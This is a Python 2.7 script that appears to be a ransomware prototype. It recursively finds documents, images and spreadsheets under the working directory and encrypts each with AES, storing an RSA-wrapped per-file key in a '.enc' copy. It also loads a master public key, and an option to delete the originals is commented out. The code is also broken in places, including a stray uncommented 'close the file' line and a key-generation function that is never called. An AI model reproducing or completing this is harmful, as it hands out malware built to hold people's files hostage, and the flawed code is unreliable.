#Python 2.7
import os
import base64
import ast
from Crypto import Random
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from make_keys import *
from decrypt_key import decrypt_key

#if os.path.exists("private_key.pem") or os.path.getsize("private_key.pem") > 0:
	#os.remove("private_key.pem")

if os.path.exists("private_key.pem") and os.path.exists("public_key.pem") and os.path.getsize("public_key.pem") > 0 and os.path.getsize("private_key.pem") > 0:
	pass
else:
	print "[*] No key files detected"
	print "[*] Making key files now..."
	#generate public and private RSA keys for the Client
	make_keys

#load master_pub_key
with open("master_public.pem", "r") as keyfile:
	master_public = keyfile.read()
	keyfile.close()

master_pub_key = RSA.importKey(master_public)

#no need to load local private key for encryption

#load local public_key
with open("public_key.pem", "r") as keyfile:
	local_public = keyfile.read()
	keyfile.close()

local_pub_key = RSA.importKey(local_public)

def pad(data):
	return data + b"\0" * (AES.block_size - len(data) % AES.block_size)

def encrypt(plaintext, cleartext_key, key_size=356):
	plaintext = pad(plaintext)
	iv = Random.new().read(AES.block_size)
	cipher = AES.new(cleartext_key, AES.MODE_CBC, iv)
	cipher_text = (iv + cipher.encrypt(plaintext))
	return cipher_text

def encrypt_file(file_name, cleartext_key, encrypted_key):
	with open(file_name, 'r') as unencypted_file:
		plaintext = unencypted_file.read()
	crypt = encrypt(plaintext, cleartext_key)
	with open(file_name + ".enc", 'w') as encrypted_file:
		#encrypted_file.write(crypt)
		#place the encrypted_key on top of the encrypted file
		encrypted_file.write(str(encrypted_key) + "\n")
		#place the encrypted file content 
		encrypted_file.write(crypt)
		close the file
		encrypted_file.close()
	#Option to delete the original file
	#option = raw_input("Do you want to delete the original file?[Y/N]: ")
	#if option == "Y" or option == "y":
	#os.remove(file_name)

def main():
	ext = [".txt","csv","jpg",".docx",".pdf",".pptx",".png",".xlsx"]
	files_to_enc = []
	#dir_path = os.path.dirname(os.path.realpath(__file__))
	dir_path = os.getcwd()
	for root, dirs, files in os.walk(dir_path):
		for file in files:
			if file.endswith(tuple(ext)):
				files_to_enc.append(os.path.join(root, file))
	print "Encrypting all files in directory " + str(dir_path)
	print "Encrypting files: " + str(files_to_enc)
	for files in files_to_enc:
		cleartext_key = os.urandom(32)
		encrypted_key = local_pub_key.encrypt(cleartext_key, 32)
		encrypt_file(files, cleartext_key, encrypted_key)
	print "[*] Encryption Complete!\n"

if __name__ == "__main__":
	main()
